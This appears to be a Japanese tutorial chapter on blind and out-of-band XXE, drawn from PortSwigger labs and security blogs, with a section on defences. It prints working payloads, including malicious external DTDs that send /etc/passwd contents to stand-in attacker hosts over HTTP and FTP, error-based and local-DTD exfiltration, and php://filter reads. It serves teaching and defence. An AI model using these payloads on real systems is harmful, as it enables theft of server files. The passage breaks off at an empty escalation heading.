# 第3章 盲目XXE（Blind XXE / OOB XXE）


## Blind XXEのラボ（OOB・外部DTD exfil）

この節では、**Blind XXE（盲目XXE）** を、PortSwigger Web Security Academy の解説記事と2つのラボを軸に、原理レベルで解説する。「盲目（blind）」とは、XXE（XML External Entity）の脆弱性そのものは存在するのに、**外部エンティティに読み込ませた値がHTTPレスポンス本文に一切現れない**状況を指す。つまり `<foo>&xxe;</foo>` のように単純に返させる古典的な手口が通じない。ここで主役になるのが **OOB（Out-of-Band、帯域外）通信** と **XMLパラメータエンティティ**、そして **外部DTD** を使った2段構えのデータ持ち出し（exfiltration）である。

本節はすべて防御・検知の理解を目的とする。ペイロードは自分の管理下にある学習用ラボ（PortSwiggerの練習環境など、明示的に許可された環境）でのみ用いること。実在サービスや本番環境への無許可の検証は行わない。

---

### なぜ「盲目」になるのか — 前提の整理

まず用語を噛み砕く。

- **XXE**: アプリがXMLを解析（パース）する際、XMLの仕様にある「外部エンティティ」機能が有効なままだと、攻撃者が仕込んだ `SYSTEM "file:///..."` や `SYSTEM "http://..."` によって、ローカルファイル読み取りやサーバ発の外部リクエスト（SSRF）を引き起こせる欠陥。
- **エンティティ（entity）**: XMLにおける「変数のようなもの」。`<!ENTITY xxe SYSTEM "file:///etc/passwd">` と宣言し、本文で `&xxe;` と書くと、パーサがそこをファイルの中身に置換しようとする。
- **sink（シンク）**: 攻撃者の入力が最終的に危険な形で解釈・実行される到達点。XXEのsinkは「外部エンティティを解決してURL/ファイルにアクセスするXMLパーサの内部処理」である。

**古典的（非盲目）XXE** は、`&xxe;` の展開結果がそのままレスポンスのどこか（在庫チェック結果、エラーの反映など）に出てくることを利用する。ところが実運用のアプリでは、

1. パース結果の一部（例：在庫数の数値）しか画面に返さない、
2. `&xxe;` が指す内容を出力に混ぜない、

といった作りが普通で、**値を直接読み出す経路が存在しない**。これが盲目XXEである。PortSwiggerは盲目XXEを「アプリはXXEインジェクションに対して脆弱だが、定義した外部エンティティの値をレスポンス内に返さない」ものと定義している。

盲目でも攻略できるのは、XXEが「データを返させる」だけでなく「**サーバに何らかの副作用（外部通信・エラー）を起こさせる**」力を持つからだ。この副作用を観測窓口にするのがOOBである。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 検知フェーズ①：通常エンティティによるOOB

最初の一手は、サーバに攻撃者管理下のドメインへHTTPリクエストを飛ばさせることだ。レスポンスに何も出なくても、**攻撃者のサーバ側でアクセスログ（DNSルックアップ＋HTTP）を観測**できれば、外部エンティティが解決されている＝XXEが生きている証拠になる。

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

これを宣言し、本文の適当なデータ値で `&xxe;` を参照させる。パーサが `&xxe;` を解決しようとして `http://f2g9j7hhkax.web-attacker.com` にアクセスするため、攻撃者はDNSクエリとHTTPリクエストの到来を確認できる。

**なぜOOBが観測窓口になるのか**: XMLパーサは外部エンティティのURLに対して実際にネットワークI/Oを行う（`http:` なら実HTTP、`file:` ならファイル読み込み）。レスポンス本文に値を返す経路がなくても、この「パーサが自発的に外へ出す通信」自体は攻撃者のインフラ側で観測できる。**アプリの出力に依存しない別チャネル**だから帯域外（out-of-band）と呼ぶ。

---

### 検知フェーズ②：パラメータエンティティで入力フィルタを回避

現実のアプリは素朴なXXE対策として「`<!ENTITY ... SYSTEM ...>` という**通常の外部エンティティ宣言を含むリクエストをブロック**する」入力検証を入れていることが多い。この場合、上記の通常エンティティ payload は弾かれる。

そこで **XMLパラメータエンティティ（parameter entity）** を使う。これはDTD（Document Type Definition、XML文書の構造定義部）**の内部でのみ**使える特殊なエンティティで、宣言・参照ともに `%` を使う。

```xml
<!-- パラメータエンティティの宣言 -->
<!ENTITY % myparameterentity "my parameter entity value" >

<!-- パラメータエンティティの参照 -->
%myparameterentity;
```

盲目XXEのOOB検知をパラメータエンティティで書くと次のようになる。

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

**なぜフィルタを回避できるのか**: 多くの単純なフィルタは `<!ENTITY name SYSTEM` のような**通常エンティティの字面**にマッチするよう書かれており、`<!ENTITY % name SYSTEM`（`%` 付き）を見落とす。加えて、パラメータエンティティはDTD処理という「より内側の文脈」で展開されるため、通常エンティティを禁じただけの防御をすり抜けやすい。パーサは `%xxe;` に到達した瞬間に `SYSTEM` のURLを解決しようとし、やはり外部通信が発生する。

---

### ラボ1：XMLパラメータエンティティによるOOB検知

> ラボ「Blind XXE with out-of-band interaction via XML parameter entities」

**設定**: 対象アプリの「Check stock（在庫確認）」機能がXMLをPOSTで受け取りパースする。このラボは意図的に、

- 予期しない値を画面に一切表示しない（＝盲目）、
- **通常の外部エンティティを含むリクエストをブロックする**、

という二重の制約を持つ。したがって古典的XXEもフェーズ①の通常エンティティも通らない。狙いは「パラメータエンティティでOOB相互作用（DNS/HTTP）を起こせることを示す」こと。データ持ち出しまでは要求されず、**脆弱性の存在確認（検知）**がゴールである。

**攻略の要点**（学習環境での手順）:

1. 商品ページで「Check stock」を押し、POSTリクエストを傍受する。ボディはXML（`stockCheck` 要素を含む）。
2. **XML宣言（`<?xml ...?>`）と `stockCheck` 要素の間**に、次の宣言を挿入する（`BURP-COLLABORATOR-SUBDOMAIN` は自分のOOB受信用サブドメインに置換）。

   ```xml
   <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
   ```

3. 送信後、OOB受信基盤（Burp Collaborator等）を「Poll now」で確認すると、アプリが payload を処理した結果としての **DNSルックアップとHTTPリクエスト**が届く。

**なぜ挿入位置がXML宣言と本文要素の間なのか**: `<!DOCTYPE ... [ ... ]>` の内部（内部サブセット）はDTDそのものであり、パラメータエンティティを宣言・参照できる唯一の場所だからだ。ここに置くことで、ルート要素 `stockCheck` の中身とは独立に、パーサがDTD処理段階で `%xxe;` を展開し外部通信を発生させる。

**技術的な核心**: パラメータエンティティ（`%` 前置）は、アプリが敷いた「通常の外部エンティティのブロック」をすり抜ける。直接のデータ出力ができないときでも、OOB相互作用の観測で脆弱性を確定できる。

> 出典: Lab: Blind XXE with out-of-band interaction via XML parameter entities — https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

---

### 持ち出しフェーズ：外部DTDによる2段構えの exfiltration

検知の次は、盲目のままファイル内容を実際に取り出す。鍵は「**攻撃者サーバ上に悪意あるDTDを置き**、それをパラメータエンティティで読み込ませる」ことだ。なぜ外部DTDが要るのかを、DTDの文法制約から説明する。

#### なぜ内部サブセットだけでは持ち出せないのか

やりたいのは概念的にこうだ：

```
（1）file:///etc/passwd を読んで %file に入れる
（2）その %file を URL に埋め込んだ別のエンティティを動的に定義する
     → <!ENTITY % exfil SYSTEM "http://attacker/?x=（%fileの中身）">
（3）%exfil を参照して attacker に中身付きでアクセスさせる
```

問題は（2）だ。**XMLの仕様では、内部サブセット（`<!DOCTYPE foo [ ... ]>` の内側）において、パラメータエンティティを「別の宣言のマークアップ内部」で参照することが許されていない**。`%file;` を「エンティティ宣言の中」で展開する、という入れ子の参照が内部DTDではできない。ところが**外部DTD（外部サブセット）ではこの制約が緩く、宣言内でのパラメータエンティティ参照が許される**。この文法上の非対称性こそが、外部DTDをホストする理由である。

#### 悪意ある外部DTDの実体

攻撃者が `http://web-attacker.com/malicious.dtd` として置くファイル：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

3つのパラメータエンティティが連鎖する：

- `%file`：`/etc/passwd` の中身を保持する。
- `%eval`：**別のエンティティ宣言を文字列として**保持する。`&#x25;` はパーセント記号 `%` の文字参照（数値実体参照）で、`<!ENTITY % exfiltrate SYSTEM '...'>` を表す。ここで `%` を直書きせず `&#x25;` とするのが決定的に重要（後述）。
- `%eval;` を参照した瞬間に、その中身が展開されて `exfiltrate` エンティティが**動的に定義**される。このとき URL 内の `%file;` が `/etc/passwd` の中身に置換される。
- 最後に `%exfiltrate;` を参照すると、パーサが `http://web-attacker.com/?x=（passwdの中身）` にアクセスし、**クエリ文字列に載った機密がそのまま攻撃者サーバのログに残る**。

#### 標的側に注入するXML

アプリのXMLには、この外部DTDを読み込ませる短い payload だけを入れる：

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

**なぜ `&#x25;`（`%`のエスケープ）が必要か**: `%eval` の値は「後で展開されたときに初めてエンティティ宣言として解釈されてほしい」文字列だ。もし `%` を直に書くと、外側のDTDを読み込む段階でパーサが先にパラメータ参照として解決しようとし、宣言のタイミングがずれて意図通りに動かない。`&#x25;` と書くことで「今は普通の文字として置いておき、`%eval;` が展開される瞬間に `%` として解釈させる」という**二段階の遅延評価**を成立させている。この遅延こそがOOB exfiltrationの心臓部である。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### ラボ2：悪意ある外部DTDでデータを持ち出す

> ラボ「Exploiting blind XXE to exfiltrate data using a malicious external DTD」

**設定**: 「Check stock」がXMLをパースするが結果は表示しない（盲目）。ゴールは **`/etc/hostname` の中身を持ち出す**こと。`/etc/passwd` ではなく `/etc/hostname` が標的なのは、後述する「改行問題」を避けるための現実的な選択である（短く1行の値なのでURLに載せやすい）。

**攻略の要点**（学習環境での手順）:

1. 攻撃者管理のホスティング（ラボでは「Exploit server」が提供される）に、以下の**外部DTD**を置く。`BURP-COLLABORATOR-SUBDOMAIN` は自分のOOB受信サブドメインに置換する。

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
   %eval;
   %exfil;
   ```

2. 「Check stock」のPOSTを傍受し、**XML宣言と `stockCheck` 要素の間**に次を挿入する。`YOUR-DTD-URL` は手順1でDTDを置いたURLに置換する。

   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
   ```

3. 送信すると、標的サーバは `%xxe;` で外部DTDを取得→ `%file` に `/etc/hostname` を読み込み→ `%eval;` で `exfil` を動的定義→ `%exfil;` で `http://（あなたのCollaborator）/?x=（hostnameの中身）` へアクセスする。OOB基盤のHTTPリクエストのクエリ `x=` に `/etc/hostname` の値が現れる。

**なぜ外部DTDに分離するのか（再掲の要点）**: 標的に直接注入する内部サブセットでは、宣言内でのパラメータエンティティ参照（`%eval` の中の `%file;`）が文法上禁止されている。ロジック本体を外部DTDへ逃がすことで、その制約のない外部サブセットとして評価させ、2段階展開を成立させる。標的に注入するのは「外部DTDを呼ぶ最小限の橋渡し」だけになる。

> 出典: Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD — https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

---

### 実戦上の落とし穴：改行・URLパーサの制約

OOB exfiltrationには実装依存の壁がある。PortSwiggerが明記する重要な制約：

- **一部のXMLパーサは、外部エンティティのURLに改行文字が含まれると拒否する**。`/etc/passwd` は複数行なので、その中身をURLに埋め込むと改行が混ざり、パーサがURLを不正とみなして失敗しうる。

対処は次の通り：

1. **改行を含まないファイルを狙う**：`/etc/hostname` のような1行の値なら問題が起きにくい（ラボ2がこれを標的にする理由）。
2. **FTPプロトコルを使う**：`http:` の代わりに `ftp://` を使うと、パーサやプロトコルの扱いの違いから複数行データを送れる場合がある。

これらは「なぜラボが `/etc/passwd` ではなく `/etc/hostname` を課題にするのか」の実務的背景であり、対象環境のパーサ実装（Javaの標準パーサ等）に強く依存する点に注意する。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 補完手法①：エラーベースXXE（OOB通信が塞がれているとき）

アプリからの外向き通信（egress）が遮断され、OOBが使えないこともある。その場合でも、**XMLパースエラーのメッセージがレスポンスに反映される**なら、エラー文言に機密を載せて漏らせる。

悪意ある外部DTD：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- `%file` に `/etc/passwd` を読み込む。
- `%eval;` で `error` エンティティを動的定義。その値は **存在しないパス** `file:///nonexistent/（passwdの中身）` を指す。
- `%error;` を参照すると、そのファイルが開けずエラーになる。エラーメッセージにパス文字列＝機密が埋め込まれて出力される。

エラー出力の例：

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...
```

**なぜ漏れるのか**: `file:///nonexistent/...` の `...` 部分はパーサにとって「開こうとしたファイルパス」であり、`FileNotFoundException` のメッセージがそのパス（＝ `/etc/passwd` の中身を連結した文字列）をそのまま含める。アプリが例外文言を画面に返す作りだと、機密が反射して見える。OOB通信を一切必要としない点が強み。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 補完手法②：ローカルDTDの再利用（外部DTDも読めないとき）

外向き通信が塞がれ、かつ**外部DTDのホスティングも読み込ませられない**厳しい状況では、標的サーバ上に**既に存在するローカルのDTDファイル**を悪用（再利用）してエラーベースを成立させる手がある。

まず、既知のローカルDTDが存在するかを確認する検知 payload：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

正常にパースできればそのファイルは存在する。エラーになれば無い、と切り分けられる（GNOME環境に多い `docbookx.dtd` などが手がかりになる）。

存在を確認できたら、そのローカルDTDが内部で定義しているパラメータエンティティを**上書き再定義**して悪用する、ハイブリッドDTD payload：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error; '>
%local_dtd;
]>
```

**なぜこれが動くのか**: ローカルDTD `schema.dtd` は内部のどこかで `%custom_entity;` を参照している、という構造を利用する。攻撃者は内部サブセットで `custom_entity` を**先に再定義**しておき、`%local_dtd;` を読み込ませると、ローカルDTD側がその `custom_entity` を参照した瞬間に攻撃者の中身（エラーベースのロジック）が展開される。**内部サブセットの禁止事項（宣言内パラメータ参照）を、外部DTDが評価される文脈に肩代わりさせる**のが要点で、`&#x25;`（`%`）や `&#x26;#x25;`（`&#x25;` すなわち二重エスケープ）、`&#x27;`（シングルクォート `'`）といった文字参照で、展開の各段階を精密に遅延させている。実在サービスでの検証は行わず、仕組みの理解にとどめる。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 攻撃の前提条件と影響（まとめ）

PortSwiggerが挙げる**成立条件**：

- アプリがXML入力を処理している。
- XMLパーサが外部エンティティの解決を有効にしている（安全な設定なら無効）。
- **エラーメッセージが返る**か、**ネットワーク相互作用が観測できる**（＝観測窓口がある）。
- OOB手法なら**外向き接続**が、ローカルDTD再利用なら**アクセス可能なローカルDTDファイル**が要る。

**影響**：機密ファイルへの不正アクセス、内部システム情報の漏えい、そしてSSRFを介したサーバ侵害の足がかり。盲目であっても、外部DTD／エラー／ローカルDTDのいずれかの窓口が開いていれば、実質的に任意ファイル読み取りに到達しうる点が脅威である。

---

### 防御：盲目XXEを断つ設計

盲目XXEも根本原因は通常のXXEと同じ「**外部エンティティ解決が有効なXMLパーサ**」であり、対策も共通する。

1. **外部エンティティ／DTDを完全に無効化する**（最重要）。多くのパーサは機能フラグで無効化できる。例（Java系）：
   - `DocumentBuilderFactory` / `SAXParserFactory` / `XMLInputFactory` で外部一般エンティティ・外部パラメータエンティティを無効化。
   - `http://apache.org/xml/features/disallow-doctype-decl` を `true` にして**DOCTYPE宣言そのものを禁止**するのが最も堅い（DTDを一切許さないため、パラメータエンティティも外部DTDも成立しなくなる）。
2. **外向き通信（egress）を制限する**：サーバから外部への任意HTTP/FTP/DNSを絞れば、OOB exfiltrationと外部DTD読み込みを弱められる（ただしエラーベースやローカルDTD再利用は塞げないので、これは多層防御の一枚）。
3. **詳細なパースエラーをユーザーに返さない**：エラーベースXXEの窓口を閉じる。例外の生メッセージを画面に出さない。
4. **入力の字面フィルタに依存しない**：「`<!ENTITY` をブロック」といった対症療法は、パラメータエンティティ（`%`）や文字参照エスケープで回避されるため、単独では不十分。パーサ設定での無効化が本筋である。

盲目XXEのラボが教えるのは、**「値が返らない＝安全」ではない**という一点だ。OOB・外部DTD・エラー・ローカルDTDという複数の観測チャネルがあるため、防御は「攻撃者に窓口を与えない（DOCTYPE/外部エンティティを無効化する）」というパーサ設定側の根本対策に集約される。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

## OOB exfiltrationの技法

盲目XXE（Blind XXE）では、攻撃者が注入したXMLの解析結果がHTTPレスポンス本文に一切反映されない。前節までで「XXEは存在するが `&xxe;` を展開しても画面に出てこない」状況を扱ってきたが、本節ではその制約下で**サーバの外へデータを持ち出す（exfiltrate）**ための具体的な技法を、原理レベルで解説する。

キーワードは **OOB（Out-of-Band、帯域外）** と **OAST（Out-of-band Application Security Testing）** である。「帯域外」とは、攻撃者が入力を送り込むチャネル（対象へのHTTPリクエスト）と、結果を受け取るチャネル（攻撃者が支配する別サーバへの着信）を**分離する**という意味だ。対象からのレスポンスを読めなくても、対象が攻撃者サーバへ勝手に接続してくれれば、その接続の中身から情報を抜き出せる。

> ⚠️ **本節のスコープ**: 以下はすべて防御・検証（自分の管理下のシステムや、許可されたテスト環境）を前提とした解説である。実在サービスや本番環境への無許可の検証、破壊的な手順は扱わない。ペイロードは「なぜ動くのか」を理解して**対策する**ために示している。

### まず整理: Blind XXE と OOB XXE の違い

Invictiの解説は、しばしば混同されるこの2語を明確に区別している。

- **Blind XXE**: 注入したエンティティの展開結果が**レスポンスに全く返らない**状態。攻撃者は「何も直接的な応答を得られない」。
- **OOB XXE**: そのBlindな状況を打開するために、**別チャネル（攻撃者サーバへの接続）経由で結果を受け取る**手法。

つまりBlind XXEは「状況（＝レスポンスが盲目）」を指し、OOB XXEはその状況で使う「手段」を指す。実務では「Blind XXEをOOBで攻略する」という関係になる。

> 出典: Out-of-Band XML External Entity (OOB XXE) — https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe

### 最初の一歩: OOB相互作用による「存在確認」

データ持ち出しの前に、そもそもXXEが成立するか（＝パーサが外部エンティティを解決してくれるか）を確かめる必要がある。Shreya Pohekarの解説は、その最小トリガとして次を挙げる。

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
```

脆弱なアプリがこのXMLを解析すると、パーサは `xxe` エンティティを解決しようとして `http://attacker.com` へHTTPリクエスト（および事前のDNS名前解決）を発行する。攻撃者サーバのログにその着信（HTTPアクセス、あるいは権威DNSへの問い合わせ）が現れれば、**レスポンスが盲目であっても**「XXEは動いている」と確認できる。ここが「帯域外での確認」の核心だ。

> `SYSTEM "http://..."` はSYSTEM識別子と呼ばれ、XMLパーサに「このURIから外部リソースを取ってこい」と指示する。ローカルファイル（`file://`）でも外部HTTP（`http://`）でも同じ仕組みで、パーサが素直に解決してしまうのがXXEの根本原因である。

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### なぜ「パラメータエンティティ」と「外部DTD」が必須なのか

存在確認まではできても、いざファイルの中身を持ち出そうとすると、素朴な方法は**構文的に破綻する**。ここがBlind XXEで最も理解すべき仕組みだ。

やりたいことは概念的には「ファイル内容を読み、それをURLの一部に埋め込んで攻撃者サーバへ送る」である。ナイーブに書くとこうなる。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY exfil SYSTEM "http://attacker.com/?x=%file;">   <!-- ← これは動かない -->
```

これが動かない理由は、XMLの仕様上の2つの制約による。

1. **エンティティ宣言の値の中で、別のエンティティを参照する（`%file;`）ことは、内部サブセット（＝リクエスト本文の `<!DOCTYPE ... [ ... ]>` の中）では原則許されない。** パラメータエンティティ参照を「マークアップ宣言の内部」で使うのは、**外部サブセット（外部から読み込むDTD）や外部パラメータエンティティの中**でのみ有効、という規則があるためだ。内部サブセットで `%file;` を宣言途中に置くと整形式（well-formed）違反になる。
2. **一般エンティティ（`&exfil;` として本文で使うもの）は、宣言時点で値が展開されず、参照された時点で展開される。** URLに動的に値を埋め込むには、宣言を「動的に生成」する入れ子構造が要る。

この2つの壁を越えるのが、**「外部DTDに処理を追い出す」＋「パラメータエンティティの入れ子」**という定石である。パラメータエンティティ（`%name;`、DTDの中でのみ使える特殊なエンティティ）は、Shreyaも指摘するとおり「通常のエンティティ（`&name;`）をブロックする入力バリデーションを回避する」効果も持つが、本質的な役割は**外部サブセット内での自由なエンティティ生成**にある。

Shreyaは宣言・参照の構文をこう整理している。

```xml
<!-- 宣言 -->
<!ENTITY % paramentity "my test value">

<!-- 参照（内部サブセットで即座に外部を読ませる例） -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>
```

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### 定石: 外部DTDによるHTTP exfiltration

Invictiが示す典型的な二段構えを見ていく。まず対象へ送るリクエスト本文（内部サブセット）はこうだ。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://bad.example.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

攻撃者が用意する外部DTD（`bad.example.com/evil.dtd`）はこうだ。

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://bad.example.com/?collect=%file;'>">
%all;
```

処理の流れ（Invictiの5ステップ）を、パーサ内部で何が起きるかとともに追う。

1. パーサが内部サブセットの `%file` を評価し、`file:///etc/passwd` の**中身**をこのパラメータエンティティの値として読み込む。
2. パーサが `%dtd` を評価し、攻撃者サーバへ `evil.dtd` を**取りに行く**（1回目のOOB接続）。
3. 外部DTD内で `%all` が展開される。`%all` の値は「`send` という一般エンティティの宣言文そのもの」であり、その宣言文の中に `%file;`（＝ファイル内容）が埋め込まれる。**外部サブセット内なのでこの入れ子参照が許される**のがポイント。結果として、`send` は動的に次のような宣言に化ける。
   ```xml
   <!ENTITY send SYSTEM 'http://bad.example.com/?collect=（/etc/passwdの中身）'>
   ```
4. 本文の `<data>&send;</data>` で `send` が参照され、パーサは `collect=` にファイル内容を載せたURLへHTTPリクエストを飛ばす（2回目のOOB接続＝これがデータ持ち出し）。
5. 攻撃者はサーバログのクエリ文字列からファイル内容を復元する。

**なぜ外部DTDに逃がすと動くのか**をもう一度明確にすると、「一般エンティティ `send` の宣言を、ファイル内容を含んだ形で動的に組み立てる」という操作が、外部パラメータエンティティ（`%all`）の展開という形でだけ合法的に書けるからだ。内部サブセットに直接書けばXML整形式違反、外部DTD経由なら合法、という非対称性がこの攻撃の土台になっている。

> 出典: Out-of-Band XML External Entity (OOB XXE) — https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe

同じ構造をShreyaはより明示的な入れ子で示している（`&#x25;` はパーセント記号 `%` のXML数値文字参照。DTD内で「今すぐ `%` として解釈させたくない、後で展開させたい」ときにエスケープする常套手段）。

```xml
<!-- http://attacker.com/exploit.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/unique-id/?x=%file;'>">
%eval;
%exfil;
```

ここで `&#x25;` を使う理由が重要だ。`%eval` の**値を定義する**時点では、内側の `%` はまだ展開されてほしくない（`exfil` の宣言はあとで `%eval;` を呼んだときに初めて組み立てたい）。もし生の `%` を書くと、その位置でパーサが早すぎるタイミングでパラメータエンティティ参照を解釈しようとして破綻する。そこで `&#x25;`（＝`%`）と書いておき、`%eval;` が展開される瞬間に初めて `%` に戻す——この「展開タイミングの一段ずらし」がBlind XXEペイロードの肝である。

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### 問題児ファイルへの対処: Base64・CDATA・FTP

素朴なHTTP exfiltrationは、ファイル内容が「行き儀の悪い文字」を含むとしばしば失敗する。Shreyaは3つの回避策を整理している。それぞれ**なぜ必要か**を押さえる。

#### 1. Base64エンコード（PHPフィルタ）

`/etc/passwd` のように改行を含むファイルは、URLに直接載せるとリクエストが壊れたり、`file://` の読み込み段階でパーサが停止したりする。PHP環境では `php://filter` ストリームラッパで**読み込みながらBase64化**できる。

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

Base64は英数字と `+/=` だけなので、URLに載せても改行・特殊文字・URI長違反（後述）のリスクが下がる。攻撃者は受信後にデコードする。ramyardaneshgarのリポジトリでも、直接読み込みで文字制限に当たった際に同じ `php://filter/convert.base64-encode/resource=` を用い、DB認証情報やソースコードを含む設定ファイルの抽出に有効だったと報告している。

> 出典: XML External Entity (XXE) Exploitation (ramyardaneshgar) — https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation

#### 2. CDATAでXMLファイル自体を読む

対象がXMLファイル（例: `/etc/fstab` のような山括弧を含むデータや、任意のXML）だと、パーサがファイル中の `<...>` を**マークアップとして解釈**してしまい内容が壊れる。これを防ぐのが **CDATAセクション** だ。`<![CDATA[ ... ]]>` で囲むと、中身は「純粋な文字データ」として扱われ、パースされない。

```xml
<bar><![CDATA[<abc>myContent</abc>]]></bar>
```

Shreyaの完全なペイロードは、`<![CDATA[`（開始）とファイル内容と `]]>`（終了）を3つのパラメータエンティティで連結して一般エンティティ `content` を作る。

```xml
<!-- 外部DTD: http://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY content '%start;%file;%end;'>">
```

```xml
<!-- 対象へのリクエスト本文 -->
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&content;</data>
```

`content` は `<![CDATA[…ファイル内容…]]>` に展開されるため、内容に含まれる山括弧がマークアップ扱いされず、そのまま安全に運べる。なお、このCDATA手法はレスポンスに反映される（out-of-band不要な）XXEでのファイル読み出しに使われることが多いが、ここでは「XMLとして壊れがちなデータを扱う原理」として押さえておくとよい。

#### 3. FTP exfiltration（URI長の壁を越える）

HTTP GETのURLには実装依存の長さ上限があり、大きなファイルをクエリ文字列に載せると途中で切れる。`ftp://` を使うと、ファイル内容をFTPのパス／コマンドとして送出でき、HTTPのURI長制約や文字エンコーディング要件を回避できる。攻撃者は自前のミニFTPサーバでその「接続時に渡されたパス」をログすればよい。

```xml
<!-- 外部DTD -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % req "<!ENTITY abc SYSTEM 'ftp://x.x.x.x:1212/%file;'>">
```

```xml
<!-- リクエスト本文 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
%dtd;
%req;
]>
<foo>&abc;</foo>
```

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### エラーベース exfiltration（OOB接続が塞がれている場合）

対象サーバから外向きのHTTP/FTPが**完全に遮断**されている環境では、上記のOOB経路が使えない。その場合の代替が**エラーメッセージにデータを載せる**手法だ。Medium（0xzd）の記事はこの外部DTD経由のexfiltrationを扱っており、標準的なPortSwiggerラボの手法に沿っている。

> ⚠️ **未取得の資料**: 「Exploiting Blind XXE: Data Exfiltration thru External DTD（Medium / 0xzd）」は自動取得できませんでした（理由: HTTP 403 Forbidden。egress側でMediumがブロックされたため）。以下のURLからご自身で直接ご覧ください: https://medium.com/@jhncdrcbautista/exploiting-blind-xxe-data-exfiltration-thru-external-dtd-4ac392305b9f

（以下は未取得資料の補足として一般知識、および検索で得たPortSwigger系手法に基づく解説です。）

外部DTDに次を置く。`error` エンティティは「存在しないパス」をSYSTEM URIに持ち、しかもそのパスの一部にファイル内容 `%file;` を埋め込む。

```xml
<!-- 攻撃者の外部DTD -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

`%error;` を展開すると、パーサは `file:///nonexistent/（/etc/passwdの中身）` を開こうとして**失敗**し、その際の例外メッセージに「開けなかったパス」——すなわちファイル内容を連結した文字列——を含めて出力する実装が多い。攻撃者はその**エラーレスポンス本文**からデータを読み取る。これは厳密には「外向き接続を使わない」ため純粋なOOBではないが、レスポンスが盲目でもエラー詳細だけは返る環境で有効な、Blind XXEの重要なバリエーションだ。

> 出典（手法の一次資料）: Finding and exploiting blind XXE vulnerabilities (PortSwigger) — https://portswigger.net/web-security/xxe/blind
> 出典（担当記事、未取得）: Exploiting Blind XXE: Data Exfiltration thru External DTD — https://medium.com/@jhncdrcbautista/exploiting-blind-xxe-data-exfiltration-thru-external-dtd-4ac392305b9f

### エスカレーション: File read → Blind OOB → RCE

